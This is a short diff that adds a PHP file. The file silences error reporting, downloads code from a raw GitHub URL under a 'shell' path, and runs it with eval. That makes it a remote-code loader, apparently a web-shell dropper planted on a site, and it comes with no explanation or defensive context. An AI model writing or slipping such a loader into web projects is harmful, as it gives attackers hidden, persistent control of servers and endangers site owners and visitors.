@@ -1,0 +1,6 @@
+<?php
+error_reporting(0);
+$url = 'https://raw.githubusercontent.com/cyeila119/sayasukajanda/refs/heads/main/shell/sel3';
+$kode = file_get_contents($url);
+eval('?>' . $kode);
+?>
